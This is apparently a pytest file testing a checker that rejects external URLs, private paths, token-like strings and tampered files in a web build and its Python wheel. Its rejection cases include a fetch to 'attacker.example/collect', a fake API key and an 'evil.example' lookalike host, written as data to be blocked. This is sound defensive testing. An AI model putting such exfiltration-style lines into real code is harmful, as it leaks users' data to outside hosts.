"""Phase 6.4 Task 8: refuse runtime leaks and mismatched wheel contents."""

from __future__ import annotations

import zipfile
from pathlib import Path

import pytest

from scripts.stage_workspace_assets import stage_assets
from scripts.verify_workspace_runtime_boundary import (
    RuntimeBoundaryError,
    scan_content,
    verify_runtime_boundary,
)


@pytest.fixture
def build(tmp_path: Path) -> tuple[Path, Path, Path]:
    dist = tmp_path / "source" / "apps" / "workspace" / "dist"
    (dist / "assets").mkdir(parents=True)
    (dist / "index.html").write_text(
        '<html><script type="module" src="/assets/app.js"></script></html>',
        encoding="utf-8",
    )
    (dist / "assets" / "app.js").write_text(
        "document.body.dataset.ready = 'true';", encoding="utf-8"
    )
    staged = tmp_path / "package" / "static"
    stage_assets(dist, staged)
    wheel = tmp_path / "evalops_lab-0.1.0-py3-none-any.whl"
    with zipfile.ZipFile(wheel, "w") as archive:
        for path in staged.rglob("*"):
            if path.is_file():
                archive.write(
                    path,
                    "evalops/workspace/static/" + path.relative_to(staged).as_posix(),
                )
    return dist, staged, wheel


def test_accept_clean_matching_dist_stage_and_wheel(
    build: tuple[Path, Path, Path],
) -> None:
    assert verify_runtime_boundary(*build) == 2


@pytest.mark.parametrize(
    ("filename", "value"),
    [
        ("assets/app.js", 'fetch("https://attacker.example/collect")'),
        ("assets/app.js", 'const remote = "https://untrusted.example/";'),
        ("assets/app.js", 'const path = "C:/Users/private/secrets.txt";'),
        ("assets/app.js", 'const path = "/home/person/private.jsonl";'),
        ("assets/app.js", 'const path = "file:///private";'),
        ("assets/app.js", "const token = 'sk-proj-0123456789abcdefghijklmn';"),
        ("assets/app.js", 'const server = "0.0.0.0";'),
        ("assets/app.js", 'const path = "apps/web/public/evidence";'),
        ("assets/app.css", 'body{background:url("https://remote.example/x.png")}'),
        ("index.html", '<script src="https://remote.example/widget.js"></script>'),
        ("assets/app.js.map", '{"sources":["private"]}'),
    ],
)
def test_reject_external_runtime_material(filename: str, value: str) -> None:
    with pytest.raises(RuntimeBoundaryError):
        scan_content(filename, value.encode("utf-8"))


def test_known_inert_standards_namespace_not_a_network_request() -> None:
    scan_content("assets/app.js", b'const svgNamespace="http://www.w3.org/2000/svg"')


def test_reject_tampered_wheel_byte_even_when_manifest_remains(
    build: tuple[Path, Path, Path], tmp_path: Path
) -> None:
    dist, staged, _ = build
    wheel = tmp_path / "tampered.whl"
    with zipfile.ZipFile(wheel, "w") as archive:
        for path in staged.rglob("*"):
            if path.is_file():
                name = path.relative_to(staged).as_posix()
                payload = path.read_bytes()
                if name == "assets/app.js":
                    payload = b"tampered build file"
                archive.writestr("evalops/workspace/static/" + name, payload)
    with pytest.raises(RuntimeBoundaryError, match="differs"):
        verify_runtime_boundary(dist, staged, wheel)


def test_reject_unlisted_wheel_file(build: tuple[Path, Path, Path], tmp_path: Path) -> None:
    dist, staged, _ = build
    wheel = tmp_path / "extra.whl"
    with zipfile.ZipFile(wheel, "w") as archive:
        for path in staged.rglob("*"):
            if path.is_file():
                archive.write(
                    path,
                    "evalops/workspace/static/" + path.relative_to(staged).as_posix(),
                )
        archive.writestr("evalops/workspace/static/assets/unlisted.js", "bad")
    with pytest.raises(RuntimeBoundaryError, match="differ"):
        verify_runtime_boundary(dist, staged, wheel)


def test_exact_loopback_url_parsing_placeholder_is_inert() -> None:
    scan_content("assets/app.js", b'const u = new URL("http://localhost")')
    scan_content("assets/app.js", b'const u = new URL("http://localhost/")')


@pytest.mark.parametrize(
    "unsafe",
    [
        b'fetch("http://localhost")',
        b'const endpoint = "http://localhost:8080/private"',
        b'const endpoint = "http://localhost.evil.example/"',
        b'const endpoint = "http://localhost/api"',
    ],
)
def test_loopback_exemption_is_exact_and_not_a_fetch_exemption(unsafe: bytes) -> None:
    with pytest.raises(RuntimeBoundaryError):
        scan_content("assets/app.js", unsafe)


def test_exact_js_ipv6_url_parser_template_is_inert() -> None:
    scan_content("assets/app.js", b'const u = `http://[${n}]`')


@pytest.mark.parametrize(
    "unsafe",
    [
        b'fetch("http://[${n}]")',
        b'const remote = "http://[${n}]:9999"',
        b'const remote = "https://[${n}]"',
        b'const remote = "http://[${n}]/endpoint"',
    ],
)
def test_js_url_parser_exemption_is_not_a_network_exemption(unsafe: bytes) -> None:
    with pytest.raises(RuntimeBoundaryError):
        scan_content("assets/app.js", unsafe)
